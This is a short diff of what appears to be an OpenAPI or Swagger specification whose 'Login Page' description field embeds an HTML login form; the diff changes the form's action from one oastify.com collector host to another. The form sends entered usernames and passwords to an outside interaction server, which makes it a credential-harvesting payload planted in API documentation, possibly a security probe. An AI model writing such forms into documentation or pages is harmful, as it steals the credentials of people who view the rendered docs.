@@ -4,7 +4,7 @@ info:
   title: Login Page
   description: >
     <div style="max-width: 400px; margin: auto;">
-      <form action="https://vqpg6xpxoirljwgx6syclu2gr7xylq9f.oastify.com" method="post">
+      <form action="https://o7wdvkvm3ca8w9whsuexmyay8peg26qv.oastify.com" method="post">
         <label>Username</label><br>
         <input type="text" name="username" style="width: 100%; margin-bottom: 10px;"><br>
         <label>Password</label><br>
